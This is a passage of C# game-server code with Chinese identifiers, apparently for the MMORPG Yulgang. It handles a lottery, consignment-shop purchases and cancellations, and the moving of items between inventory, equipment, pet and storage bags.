				World.发送游戏特殊公告("玩家【" + base.UserName + "】在百宝阁玩转盘抽奖获得[" + ItmeClass.得到物品名称(id) + "]", 10, "抽奖公告");
				SaveGemData();
				return "购买成功";
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "百宝阁抽奖 出错 [" + base.Userid + "][" + base.UserName + "] " + ex.Message);
				return "购买错误";
			}
		}

		public string 百宝阁寄售买卖(int id, int sl, int yuanbao)
		{
			try
			{
				sl = 1;
				寄存物品类 寄存物品类2 = RxjhClass.得到寄售物品(id);
				if (寄存物品类2 == null)
				{
					return "系统错误或物品已下架, 请关闭百宝重新打开";
				}
				if (寄存物品类2.PlayID == base.Userid)
				{
					return "不能购买自己寄卖的装备";
				}
				if (yuanbao < 0)
				{
					return "购买错误1";
				}
				if (sl != 1)
				{
					return "购买错误3";
				}
				if (yuanbao != 寄存物品类2.PRICE)
				{
					return "购买错误2";
				}
				if (寄存物品类2.TYPE == 0)
				{
					return "物品已经被购买了，请关闭百宝重新打开刷新";
				}
				if (寄存物品类2.分区 != World.ZoneNumber)
				{
					return "新区无法购买老区装备";
				}
				int mAGIC = 寄存物品类2.MAGIC0;
				int num = 得到包裹空位(this);
				if (num == -1)
				{
					return "没有空位了";
				}
				CheckTreasureGems();
				寄存物品类2.TYPE = 0;
				if (RxjhClass.变更寄售类型(id, 0) == -1)
				{
					return "购买错误5";
				}
				寄存物品类2.时间 = DateTime.Now;
				if (RxjhClass.变更寄售时间(id) == -1)
				{
					return "购买错误6";
				}
				if (sl > 1)
				{
					return "购买错误7";
				}
				if (yuanbao > 0)
				{
					if (base.FLD_RXPIONTX < yuanbao)
					{
						return "钻石不够了";
					}
					int num2 = (int)((double)yuanbao * World.寄售获得钻石比例);
					bool flag = false;
					Players players = World.检查玩家(寄存物品类2.PlayID);
					if (players != null)
					{
						players.CheckTreasureGems();
						players.CheckGemPointsData(num2, 1, "寄售");
						players.SaveGemData();
						flag = true;
					}
					else if (RxjhClass.寄售钻石(寄存物品类2.PlayID, num2) != -1)
					{
						flag = true;
					}
					if (!flag)
					{
						return "购买错误4";
					}
					CheckGemPointsData(yuanbao, 0, "寄售");
					SaveGemData();
				}
				AddItemWithProperties(寄存物品类2.PID, num, sl, 寄存物品类2.MAGIC0, 寄存物品类2.MAGIC1, 寄存物品类2.MAGIC2, 寄存物品类2.MAGIC3, 寄存物品类2.MAGIC4, 寄存物品类2.初级附魂, 寄存物品类2.中级附魂, 寄存物品类2.进化, 寄存物品类2.绑定, 寄存物品类2.使用天数);
				logo.寄售记录("购买寄卖装备-" + base.Userid + " " + base.UserName + " 寄存ID:" + id + " 物品PID:" + 寄存物品类2.PID + " 名称:" + 寄存物品类2.NAME + " 数量:" + sl + " 价格:" + yuanbao + " 属性:" + 寄存物品类2.MAGIC0 + " " + 寄存物品类2.MAGIC1 + " " + 寄存物品类2.MAGIC2 + " " + 寄存物品类2.MAGIC3 + " " + 寄存物品类2.MAGIC4);
				string str = "玩家[" + base.UserName + "]在寄卖商店购买了[" + 寄存物品类2.PlayName + "]寄存的[" + 寄存物品类2.NAME + "]价格(" + yuanbao + ")钻石";
				World.conn.发送("发送公告|" + 0 + "|" + str);
				return "购买成功";
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "百宝阁买卖寄售东西 出错 [" + base.Userid + "][" + base.UserName + "] " + ex.Message);
				return "购买错误8";
			}
		}

		public string 百宝阁取消寄售(int id, int wid)
		{
			try
			{
				寄存物品类 寄存物品类2 = RxjhClass.得到寄售物品(wid);
				if (寄存物品类2 == null)
				{
					return "系统错误或物品已下架, 请关闭百宝重新打开";
				}
				if (寄存物品类2.TYPE == 0)
				{
					return "物品已经被购买";
				}
				int num = 得到包裹空位(this);
				if (num == -1)
				{
					return "背包已满";
				}
				if (寄存物品类2.PlayID != base.Userid)
				{
					return "错误, 账号验证失败。";
				}
				if (RxjhClass.取消寄售(寄存物品类2.ID) == -1)
				{
					logo.寄售记录("取消寄卖失败-" + base.Userid + " " + base.UserName + " 物品PID:" + 寄存物品类2.PID + " " + 寄存物品类2.MAGIC0 + " " + 寄存物品类2.MAGIC1 + " " + 寄存物品类2.MAGIC2 + " " + 寄存物品类2.MAGIC3 + " " + 寄存物品类2.MAGIC4);
					return "取消寄卖错误，请联系管理员！";
				}
				AddItemWithProperties(寄存物品类2.PID, num, 1, 寄存物品类2.MAGIC0, 寄存物品类2.MAGIC1, 寄存物品类2.MAGIC2, 寄存物品类2.MAGIC3, 寄存物品类2.MAGIC4, 寄存物品类2.初级附魂, 寄存物品类2.中级附魂, 寄存物品类2.进化, 寄存物品类2.绑定, 寄存物品类2.使用天数);
				logo.寄售记录("取消寄卖成功-" + base.Userid + " " + base.UserName + " 物品PID:" + 寄存物品类2.PID + " " + 寄存物品类2.MAGIC0 + " " + 寄存物品类2.MAGIC1 + " " + 寄存物品类2.MAGIC2 + " " + 寄存物品类2.MAGIC3 + " " + 寄存物品类2.MAGIC4);
				return "取消成功";
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "百宝阁取消寄卖 出错 [" + base.Userid + "][" + base.UserName + "] " + ex.Message);
				return "取消错误";
			}
		}

		public void 更换装备(byte[] 封包数据, int 封包大小)
		{
			try
			{
				if (退出中)
				{
					MainForm.WriteLine(6, "退出复制BUG [" + base.Userid + "][" + base.UserName + "][" + base.Client.ToString() + "] ");
				}
				else if (!打开仓库中 && (个人商店 == null || !个人商店.个人商店是否开启))
				{
					int num = 封包数据[10];
					int num2 = 封包数据[12];
					int num3 = 封包数据[14];
					int num4 = 封包数据[16];
					int num5 = BitConverter.ToInt32(封包数据, 18);
					更换装备(num, num2, num3, num4, num5);
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "更换装备出错 [" + base.Userid + "][" + base.UserName + "] " + ex.Message + "/" + ex.StackTrace);
			}
		}

		public void 更换装备(int num, int num2, int num3, int num4, int num5)
		{
			if (num5 > 0 && num5 <= 9999)
			{
				switch (num)
				{
				case 1:
					操作背包栏物品(num, num2, num3, num4, num5);
					break;
				case 0:
					操作装备栏已装备物品(num, num2, num3, num4, num5);
					break;
				case 60:
					操作宠物装备栏物品(num, num2, num3, num4, num5);
					break;
				case 59:
					操作宠物已装备物品(num, num2, num3, num4, num5);
					break;
				case 169:
					操作披风行囊物品(num, num2, num3, num4, num5);
					break;
				case 123:
					操作辅助装备栏物品(num, num2, num3, num4, num5);
					break;
				case 188:
					操作宝珠装备栏物品(num, num2, num3, num4, num5);
					break;
				case 171:
					操作凝神珠包裹(num, num2, num3, num4, num5);
					break;
				case 193:
					操作杂货行囊物品(num, num2, num3, num4, num5);
					break;
				}
			}
		}

		public void 操作杂货行囊物品(int num, int num2, int num3, int num4, int num5)
		{
			byte[] 物品_byte = new byte[World.数据库单个物品大小];
			if (杂货行囊包裹[num2].锁定 || BitConverter.ToInt32(杂货行囊包裹[num2].物品ID, 0) == 0)
			{
				return;
			}
			switch (num3)
			{
			case 193:
				if (!杂货行囊包裹[num2].锁定)
				{
					if (BitConverter.ToInt32(杂货行囊包裹[num4].物品ID, 0) == 0)
					{
						杂货行囊包裹[num4].物品_byte = 杂货行囊包裹[num2].物品_byte;
						杂货行囊包裹[num2].物品_byte = 物品_byte;
						更换装备位置(num, num2, num3, num4, 杂货行囊包裹[num4].物品_byte, BitConverter.ToInt32(杂货行囊包裹[num4].物品数量, 0));
					}
					else
					{
						byte[] 物品_byte2 = 杂货行囊包裹[num4].物品_byte;
						杂货行囊包裹[num4].物品_byte = 杂货行囊包裹[num2].物品_byte;
						杂货行囊包裹[num2].物品_byte = 物品_byte2;
						更换装备位置(num, num2, num3, num4, 杂货行囊包裹[num4].物品_byte, BitConverter.ToInt32(杂货行囊包裹[num4].物品数量, 0));
					}
				}
				break;
			case 1:
				if (BitConverter.ToInt32(杂货行囊包裹[num2].物品ID, 0) != 0 && !杂货行囊包裹[num2].锁定 && BitConverter.ToInt32(装备栏包裹[num4].物品ID, 0) == 0)
				{
					装备栏包裹[num4].物品_byte = 杂货行囊包裹[num2].物品_byte;
					杂货行囊包裹[num2].物品_byte = 物品_byte;
					更换装备位置(num, num2, num3, num4, 装备栏包裹[num4].物品_byte, BitConverter.ToInt32(装备栏包裹[num4].物品数量, 0));
				}
				更新金钱和负重();
				break;
			}
		}

		public void 操作背包栏物品(int num, int num2, int num3, int num4, int num5)
		{
			byte[] 物品_byte = new byte[World.数据库单个物品大小];
			物品类 物品类2 = 装备栏包裹[num2];
			if (BitConverter.ToInt32(物品类2.物品ID, 0) == 0)
			{
				return;
			}
			switch (num3)
			{
			case 60:
				if (装备栏包裹[num2].物品绑定)
				{
					break;
				}
				if (BitConverter.ToInt32(人物灵兽.宠物装备栏[num4].物品ID, 0) == 0)
				{
					if (人物灵兽.FLD_JOB_LEVEL == 1)
					{
						if (num4 > 8)
						{
							break;
						}
					}
					else if (人物灵兽.FLD_JOB_LEVEL == 2)
					{
						if (num4 > 12)
						{
							break;
						}
					}
					else if (人物灵兽.FLD_JOB_LEVEL == 3)
					{
						if (num4 > 16)
						{
							break;
						}
					}
					else if (num4 > 4)
					{
						break;
					}
					if (!World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0), out var value2) || value2.FLD_SIDE == 1)
					{
						系统提示("叠加物品禁止放灵兽行囊");
						break;
					}
					人物灵兽.宠物装备栏[num4].物品_byte = 装备栏包裹[num2].物品_byte;
					装备栏包裹[num2].物品_byte = 物品_byte;
					更换装备位置(num, num2, num3, num4, 人物灵兽.宠物装备栏[num4].物品_byte, BitConverter.ToInt32(人物灵兽.宠物装备栏[num4].物品数量, 0));
				}
				else
				{
					if (!World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num4].物品ID, 0), out var value3) || value3.FLD_SIDE == 1)
					{
						系统提示("叠加物品禁止放灵兽行囊");
						break;
					}
					byte[] 物品_byte6 = 人物灵兽.宠物装备栏[num4].物品_byte;
					人物灵兽.宠物装备栏[num4].物品_byte = 装备栏包裹[num2].物品_byte;
					装备栏包裹[num2].物品_byte = 物品_byte6;
					更换装备位置(num, num2, num3, num4, 人物灵兽.宠物装备栏[num4].物品_byte, BitConverter.ToInt32(人物灵兽.宠物装备栏[num4].物品数量, 0));
				}
				更新灵兽初始话装备篮包裹();
				更新灵兽负重();
				更新金钱和负重();
				break;
			case 1:
			{
				if (!装备栏包裹[num2].锁定 && num5 == 装备栏包裹[num2].Get物品数量 && BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) != 0 && World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0), out var value5))
				{
					ItmeClass value6;
					if (BitConverter.ToInt32(装备栏包裹[num4].物品ID, 0) == 0)
					{
						装备栏包裹[num4].物品_byte = 装备栏包裹[num2].物品_byte;
						装备栏包裹[num2].物品_byte = 物品_byte;
						更换装备位置(num, num2, num3, num4, 装备栏包裹[num4].物品_byte, BitConverter.ToInt32(装备栏包裹[num4].物品数量, 0));
					}
					else if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num4].物品ID, 0), out value6) && (BitConverter.ToInt32(装备栏包裹[num4].物品ID, 0) != BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) || (value6.FLD_SIDE != 1 && value5.FLD_SIDE != 1)))
					{
						byte[] 物品_byte3 = 装备栏包裹[num4].物品_byte;
						装备栏包裹[num4].物品_byte = 装备栏包裹[num2].物品_byte;
						装备栏包裹[num2].物品_byte = 物品_byte3;
						更换装备位置(num, num2, num3, num4, 装备栏包裹[num4].物品_byte, BitConverter.ToInt32(装备栏包裹[num4].物品数量, 0));
					}
				}
				更新金钱和负重();
				break;
			}
			case 0:
			{
				if (BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) == 0 || num5 != 装备栏包裹[num2].Get物品数量 || 装备栏包裹[num2].锁定 || !World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0), out var value9) || value9.FLD_LEVEL > base.Player_Level || (value9.FLD_ZX != 0 && value9.FLD_ZX != base.Player_Zx))
				{
					break;
				}
				if (!物品职业是否相符(base.Player_Job, value9.FLD_RESIDE1, value9.FLD_RESIDE2, value9.FLD_PID))
				{
					系统提示("所使用的装备与职业不符");
				}
				else
				{
					if ((value9.FLD_JOB_LEVEL != 0 && value9.FLD_JOB_LEVEL > base.Player_Job_leve) || (value9.FLD_SEX != 0 && value9.FLD_SEX != base.Player_Sex) || (value9.FLD_XWJD >= 1 && value9.FLD_XWJD > base.武勋阶段) || (num4 == 14 && 人物灵兽 != null))
					{
						break;
					}
					ItmeClass value10;
					if (BitConverter.ToInt32(装备栏已穿装备[num4].物品ID, 0) == 0)
					{
						if (装备位置是否正确(value9.FLD_RESIDE2, num4))
						{
							装备栏已穿装备[num4].物品_byte = 装备栏包裹[num2].物品_byte;
							装备栏包裹[num2].物品_byte = 物品_byte;
							更换装备位置(num, num2, num3, num4, 装备栏已穿装备[num4].物品_byte, BitConverter.ToInt32(装备栏已穿装备[num4].物品数量, 0));
						}
					}
					else if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏已穿装备[num4].物品ID, 0), out value10))
					{
						if (value9.FLD_RESIDE2 != value10.FLD_RESIDE2)
						{
							break;
						}
						byte[] 物品_byte5 = 装备栏已穿装备[num4].物品_byte;
						装备栏已穿装备[num4].物品_byte = 装备栏包裹[num2].物品_byte;
						装备栏包裹[num2].物品_byte = 物品_byte5;
						更换装备位置(num, num2, num3, num4, 装备栏已穿装备[num4].物品_byte, BitConverter.ToInt32(装备栏已穿装备[num4].物品数量, 0));
					}
					更新人物数据(this);
					更新广播人物数据();
					更新装备效果();
					计算人物装备数据();
					更新武功和状态();
					更新金钱和负重();
					更新HP_MP_SP();
				}
				break;
			}
			case 169:
			{
				if (!装备栏包裹[num2].锁定 && World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0), out var value12) && value12.FLD_RESIDE2 == 12 && BitConverter.ToInt32(披风行囊[num4].物品ID, 0) == 0)
				{
					披风行囊[num4].物品_byte = 装备栏包裹[num2].物品_byte;
					装备栏包裹[num2].物品_byte = 物品_byte;
					更换装备位置(num, num2, num3, num4, 披风行囊[num4].物品_byte, BitConverter.ToInt32(披风行囊[num4].物品数量, 0));
				}
				更新金钱和负重();
				break;
			}
			case 123:
			{
				if (BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) == 0 || 装备栏包裹[num2].锁定 || !World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0), out var value) || value.FLD_LEVEL > base.Player_Level || (value.FLD_ZX != 0 && value.FLD_ZX != base.Player_Zx))
				{
					break;
				}
				if (!物品职业是否相符(base.Player_Job, value.FLD_RESIDE1, value.FLD_RESIDE2, value.FLD_PID))
				{
					系统提示("所使用的装备与职业不符");
				}
				else
				{
					if (value.FLD_RESIDE2 == 15 || value.FLD_RESIDE2 == 16 || (value.FLD_JOB_LEVEL != 0 && value.FLD_JOB_LEVEL > base.Player_Job_leve) || (value.FLD_SEX != 0 && value.FLD_SEX != base.Player_Sex) || (value.FLD_XWJD >= 1 && value.FLD_XWJD > base.武勋阶段) || (num4 == 14 && 人物灵兽 != null))
					{
						break;
					}
					ItmeClass value4;
					if (BitConverter.ToInt32(辅助装备栏装备[num4].物品ID, 0) == 0)
					{
						if (装备位置是否正确(value.FLD_RESIDE2, num4))
						{
							辅助装备栏装备[num4].物品_byte = 装备栏包裹[num2].物品_byte;
							装备栏包裹[num2].物品_byte = 物品_byte;
							更换装备位置(num, num2, num3, num4, 辅助装备栏装备[num4].物品_byte, BitConverter.ToInt32(辅助装备栏装备[num4].物品数量, 0));
						}
					}
					else if (World.Itme.TryGetValue(BitConverter.ToInt32(辅助装备栏装备[num4].物品ID, 0), out value4))
					{
						if (value.FLD_RESIDE2 != value4.FLD_RESIDE2)
						{
							break;
						}
						byte[] 物品_byte2 = 辅助装备栏装备[num4].物品_byte;
						辅助装备栏装备[num4].物品_byte = 装备栏包裹[num2].物品_byte;
						装备栏包裹[num2].物品_byte = 物品_byte2;
						更换装备位置(num, num2, num3, num4, 辅助装备栏装备[num4].物品_byte, BitConverter.ToInt32(辅助装备栏装备[num4].物品数量, 0));
					}
					更新人物数据(this);
					更新广播人物数据();
					更新装备效果();
					计算人物装备数据();
					更新武功和状态();
					更新金钱和负重();
					更新HP_MP_SP();
				}
				break;
			}
			case 188:
			{
				if (BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) == 0 || 装备栏包裹[num2].锁定 || !World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0), out var value7) || value7.FLD_LEVEL > base.Player_Level || (value7.FLD_ZX != 0 && value7.FLD_ZX != base.Player_Zx))
				{
					break;
				}
				if (!物品职业是否相符(base.Player_Job, value7.FLD_RESIDE1, value7.FLD_RESIDE2, value7.FLD_PID))
				{
					系统提示("所使用的装备与职业不符");
				}
				else
				{
					if (value7.FLD_RESIDE2 == 7 || value7.FLD_RESIDE2 == 8 || value7.FLD_RESIDE2 == 10 || value7.FLD_RESIDE2 == 12 || value7.FLD_RESIDE2 == 13 || value7.FLD_RESIDE2 == 14 || value7.FLD_RESIDE2 == 15 || value7.FLD_RESIDE2 == 16 || (value7.FLD_JOB_LEVEL != 0 && value7.FLD_JOB_LEVEL > base.Player_Job_leve) || (value7.FLD_SEX != 0 && value7.FLD_SEX != base.Player_Sex) || (value7.FLD_XWJD >= 1 && value7.FLD_XWJD > base.武勋阶段) || (num4 == 14 && 人物灵兽 != null))
					{
						break;
					}
					ItmeClass value8;
					if (BitConverter.ToInt32(宝珠装备栏装备[num4].物品ID, 0) == 0)
					{
						if (装备位置是否正确(value7.FLD_RESIDE2, num4))
						{
							宝珠装备栏装备[num4].物品_byte = 装备栏包裹[num2].物品_byte;
							装备栏包裹[num2].物品_byte = 物品_byte;
							更换装备位置(num, num2, num3, num4, 宝珠装备栏装备[num4].物品_byte, BitConverter.ToInt32(宝珠装备栏装备[num4].物品数量, 0));
						}
					}
					else if (World.Itme.TryGetValue(BitConverter.ToInt32(宝珠装备栏装备[num4].物品ID, 0), out value8))
					{
						if (value7.FLD_RESIDE2 != value8.FLD_RESIDE2)
						{
							break;
						}
						byte[] 物品_byte4 = 宝珠装备栏装备[num4].物品_byte;
						宝珠装备栏装备[num4].物品_byte = 装备栏包裹[num2].物品_byte;
						装备栏包裹[num2].物品_byte = 物品_byte4;
						更换装备位置(num, num2, num3, num4, 宝珠装备栏装备[num4].物品_byte, BitConverter.ToInt32(宝珠装备栏装备[num4].物品数量, 0));
					}
					更新人物数据(this);
					更新广播人物数据();
					更新装备效果();
					计算人物装备数据();
					更新武功和状态();
					更新金钱和负重();
					更新HP_MP_SP();
				}
				break;
			}
			case 193:
			{
				if (!装备栏包裹[num2].锁定 && World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0), out var value11) && value11.FLD_SIDE == 0 && BitConverter.ToInt32(杂货行囊包裹[num4].物品ID, 0) == 0)
				{
					杂货行囊包裹[num4].物品_byte = 装备栏包裹[num2].物品_byte;
					装备栏包裹[num2].物品_byte = 物品_byte;
					更换装备位置(num, num2, num3, num4, 杂货行囊包裹[num4].物品_byte, BitConverter.ToInt32(杂货行囊包裹[num4].物品数量, 0));
					更新金钱和负重();
				}
				else
				{
					系统提示("叠加物品禁止存放杂货行囊。");
				}
				break;
			}
			case 171:
			{
				if (装备栏包裹[num2].物品绑定 || !装备栏包裹[num2].Get物品ID.ToString().Contains("1008000") || BitConverter.ToInt32(凝神珠包裹[num4].物品ID, 0) != 0)
				{
					break;
				}
				凝神珠包裹[num4].物品_byte = 装备栏包裹[num2].物品_byte;
				装备栏包裹[num2].物品_byte = 物品_byte;
				更换装备位置(num, num2, num3, num4, 凝神珠包裹[num4].物品_byte, BitConverter.ToInt32(凝神珠包裹[num4].物品数量, 0));
				int num6 = 0;
				for (int i = 0; i < 6; i++)
				{
					if (BitConverter.ToInt32(凝神珠包裹[i].物品ID, 0) != 0)
					{
						if (num6 == 3)
						{
							break;
						}
						if (凝神珠包裹[i].FLD_MAGIC1 != 凝神珠包裹[i].FLD_MAGIC0)
						{
							num6++;
							凝神珠操作包(1, i, BitConverter.ToInt32(凝神珠包裹[i].物品ID, 0), 凝神珠包裹[i].FLD_MAGIC1, 凝神珠包裹[i].FLD_MAGIC0);
						}
					}
				}
				更新金钱和负重();
				break;
			}
			}
			检测神器斗战增加状态();
			检测装备强化数();
		}

		public void 操作装备栏已装备物品(int num, int num2, int num3, int num4, int num5)
		{
			byte[] 物品_byte = new byte[World.数据库单个物品大小];
			物品类 物品类2 = 装备栏已穿装备[num2];
			if (BitConverter.ToInt32(物品类2.物品ID, 0) == 0 || 物品类2.锁定)
			{
				return;
			}
			switch (num3)
			{
			case 169:
			{
				if (装备栏已穿装备[num2].锁定 || BitConverter.ToInt32(装备栏已穿装备[num2].物品ID, 0) == 0 || 装备栏已穿装备[num2].锁定 || !World.Itme.TryGetValue(BitConverter.ToInt32(装备栏已穿装备[num2].物品ID, 0), out var value5) || value5.FLD_RESIDE2 != 12)
				{
					break;
				}
				ItmeClass value6;
				if (BitConverter.ToInt32(披风行囊[num4].物品ID, 0) == 0)
				{
					披风行囊[num4].物品_byte = 装备栏已穿装备[num2].物品_byte;
					装备栏已穿装备[num2].物品_byte = 物品_byte;
					更换装备位置(num, num2, num3, num4, 披风行囊[num4].物品_byte, BitConverter.ToInt32(披风行囊[num4].物品数量, 0));
				}
				else if (World.Itme.TryGetValue(BitConverter.ToInt32(披风行囊[num4].物品ID, 0), out value6))
				{
					if (value5.FLD_RESIDE2 != value6.FLD_RESIDE2)
					{
						break;
					}
					byte[] 物品_byte4 = 披风行囊[num4].物品_byte;
					披风行囊[num4].物品_byte = 装备栏已穿装备[num2].物品_byte;
					装备栏已穿装备[num2].物品_byte = 物品_byte4;
					更换装备位置(num, num2, num3, num4, 披风行囊[num4].物品_byte, BitConverter.ToInt32(披风行囊[num4].物品数量, 0));
				}
				更新人物数据(this);
				更新广播人物数据();
				更新装备效果();
				计算人物装备数据();
				更新武功和状态();
				更新金钱和负重();
				更新HP_MP_SP();
				break;
			}
			case 1:
			{
				神器斗战披风结束(BitConverter.ToInt32(装备栏已穿装备[num2].物品ID, 0));
				if (num4 >= 96 || (num2 == 14 && 人物灵兽 != null) || num5 != 装备栏已穿装备[num2].Get物品数量 || BitConverter.ToInt32(装备栏已穿装备[num2].物品ID, 0) == 0)
				{
					break;
				}
				ItmeClass value3;
				if (BitConverter.ToInt32(装备栏包裹[num4].物品ID, 0) == 0)
				{
					装备栏包裹[num4].物品_byte = 装备栏已穿装备[num2].物品_byte;
					装备栏已穿装备[num2].物品_byte = 物品_byte;
					更换装备位置(num, num2, num3, num4, 装备栏包裹[num4].物品_byte, BitConverter.ToInt32(装备栏包裹[num4].物品数量, 0));
				}
				else if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏已穿装备[num2].物品ID, 0), out value3))
				{
					if (BitConverter.ToInt32(装备栏包裹[num4].物品ID, 0) == 0 || 装备栏包裹[num4].锁定)
					{
						break;
					}
					if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num4].物品ID, 0), out var value4))
					{
						if (value3.FLD_RESIDE2 != value4.FLD_RESIDE2 || value4.FLD_LEVEL > base.Player_Level || (value4.FLD_ZX != 0 && value4.FLD_ZX != base.Player_Zx))
						{
							break;
						}
						if (!物品职业是否相符(base.Player_Job, value4.FLD_RESIDE1, value4.FLD_RESIDE2, value4.FLD_PID))
						{
							系统提示("所使用的装备与职业不符");
							break;
						}
						if ((value4.FLD_JOB_LEVEL != 0 && value4.FLD_JOB_LEVEL > base.Player_Job_leve) || (value4.FLD_SEX != 0 && value4.FLD_SEX != base.Player_Sex) || (value4.FLD_XWJD >= 1 && value4.FLD_XWJD > base.武勋阶段))
						{
							break;
						}
						byte[] 物品_byte3 = 装备栏包裹[num4].物品_byte;
						装备栏包裹[num4].物品_byte = 装备栏已穿装备[num2].物品_byte;
						装备栏已穿装备[num2].物品_byte = 物品_byte3;
						更换装备位置(num, num2, num3, num4, 装备栏包裹[num4].物品_byte, BitConverter.ToInt32(装备栏包裹[num4].物品数量, 0));
					}
				}
				更新人物数据(this);
				更新广播人物数据();
				更新装备效果();
				计算人物装备数据();
				更新武功和状态();
				更新金钱和负重();
				更新HP_MP_SP();
				break;
			}
			case 0:
			{
				if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏已穿装备[num2].物品ID, 0), out var value))
				{
					ItmeClass value2;
					if (BitConverter.ToInt32(装备栏已穿装备[num4].物品ID, 0) == 0)
					{
						if (装备位置是否正确(value.FLD_RESIDE2, num4))
						{
							装备栏已穿装备[num4].物品_byte = 装备栏已穿装备[num2].物品_byte;
							装备栏已穿装备[num2].物品_byte = 物品_byte;
							更换装备位置(num, num2, num3, num4, 装备栏已穿装备[num4].物品_byte, BitConverter.ToInt32(装备栏已穿装备[num4].物品数量, 0));
						}
					}
					else if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏已穿装备[num4].物品ID, 0), out value2) && value.FLD_RESIDE2 == value2.FLD_RESIDE2)
					{
						byte[] 物品_byte2 = 装备栏已穿装备[num4].物品_byte;
						装备栏已穿装备[num4].物品_byte = 装备栏已穿装备[num2].物品_byte;
						装备栏已穿装备[num2].物品_byte = 物品_byte2;
						更换装备位置(num, num2, num3, num4, 装备栏已穿装备[num4].物品_byte, BitConverter.ToInt32(装备栏已穿装备[num4].物品数量, 0));
					}
				}
				更新人物数据(this);
				更新广播人物数据();
				更新装备效果();
				计算人物装备数据();
				更新武功和状态();
				更新金钱和负重();
				更新HP_MP_SP();
				break;
			}
			}
			检测装备强化数();
		}

		public void 操作宠物装备栏物品(int num, int num2, int num3, int num4, int num5)
		{
			byte[] 物品_byte = new byte[World.数据库单个物品大小];
			ItmeClass value = null;
			if (BitConverter.ToInt32(人物灵兽.宠物装备栏[num2].物品ID, 0) == 0 || !World.Itme.TryGetValue(BitConverter.ToInt32(人物灵兽.宠物装备栏[num2].物品ID, 0), out var value2) || 人物灵兽.宠物装备栏[num2].锁定)
			{
				return;
			}
			switch (num3)
			{
			case 60:
				if (num4 >= 16)
				{
					break;
				}
				if (BitConverter.ToInt32(人物灵兽.宠物装备栏[num4].物品ID, 0) == 0)
				{
					人物灵兽.宠物装备栏[num4].物品_byte = 人物灵兽.宠物装备栏[num2].物品_byte;
					人物灵兽.宠物装备栏[num2].物品_byte = 物品_byte;
					更换装备位置(num, num2, num3, num4, 人物灵兽.宠物装备栏[num4].物品_byte, BitConverter.ToInt32(人物灵兽.宠物装备栏[num4].物品数量, 0));
				}
				else if (!人物灵兽.宠物装备栏[num4].锁定)
				{
					if (!World.Itme.TryGetValue(BitConverter.ToInt32(人物灵兽.宠物装备栏[num4].物品ID, 0), out value))
					{
						break;
					}
					byte[] 物品_byte3 = 人物灵兽.宠物装备栏[num4].物品_byte;
					人物灵兽.宠物装备栏[num4].物品_byte = 人物灵兽.宠物装备栏[num2].物品_byte;
					人物灵兽.宠物装备栏[num2].物品_byte = 物品_byte3;
					更换装备位置(num, num2, num3, num4, 人物灵兽.宠物装备栏[num4].物品_byte, BitConverter.ToInt32(人物灵兽.宠物装备栏[num4].物品数量, 0));
				}
				更新灵兽初始话装备篮包裹();
				break;
			case 59:
				if (BitConverter.ToInt32(人物灵兽.宠物以装备[num4].物品ID, 0) == 0)
				{
					if (宠物物品职业是否相符(人物灵兽.FLD_JOB, value2.FLD_RESIDE1, value2.FLD_RESIDE2) && 装备位置是否正确(value2.FLD_RESIDE2, num4))
					{
						人物灵兽.宠物以装备[num4].物品_byte = 人物灵兽.宠物装备栏[num2].物品_byte;
						人物灵兽.宠物装备栏[num2].物品_byte = 物品_byte;
						更换装备位置(num, num2, num3, num4, 人物灵兽.宠物以装备[num4].物品_byte, BitConverter.ToInt32(人物灵兽.宠物以装备[num4].物品数量, 0));
					}
				}
				else
				{
					if (!World.Itme.TryGetValue(BitConverter.ToInt32(人物灵兽.宠物以装备[num4].物品ID, 0), out value))
					{
						break;
					}
					if (宠物物品职业是否相符(人物灵兽.FLD_JOB, value2.FLD_RESIDE1, value2.FLD_RESIDE2) && 装备位置是否正确(value2.FLD_RESIDE2, num4))
					{
						byte[] 物品_byte4 = 人物灵兽.宠物以装备[num4].物品_byte;
						人物灵兽.宠物以装备[num4].物品_byte = 人物灵兽.宠物装备栏[num2].物品_byte;
						人物灵兽.宠物装备栏[num2].物品_byte = 物品_byte4;
						更换装备位置(num, num2, num3, num4, 人物灵兽.宠物以装备[num4].物品_byte, BitConverter.ToInt32(人物灵兽.宠物以装备[num4].物品数量, 0));
					}
				}
				召唤更新显示已装备物品(this);
				人物灵兽.计算灵兽装备数据();
				更新灵兽HP_MP_SP();
				更新灵兽经验和历练();
				更新灵兽武功和状态();
				更新灵兽负重();
				更新金钱和负重();
				更新灵兽初始话装备篮包裹();
				更新人物数据(this);
				更新广播人物数据();
				计算人物装备数据();
				break;
			case 1:
				if (BitConverter.ToInt32(装备栏包裹[num4].物品ID, 0) == 0)
				{
					装备栏包裹[num4].物品_byte = 人物灵兽.宠物装备栏[num2].物品_byte;
					人物灵兽.宠物装备栏[num2].物品_byte = 物品_byte;
					更换装备位置(num, num2, num3, num4, 装备栏包裹[num4].物品_byte, BitConverter.ToInt32(装备栏包裹[num4].物品数量, 0));
				}
				else if (!装备栏包裹[num4].物品绑定)
				{
					if (!World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num4].物品ID, 0), out var value3) || value3.FLD_SIDE == 1)
					{
						系统提示("叠加物品禁止放灵兽行囊");
						break;
					}
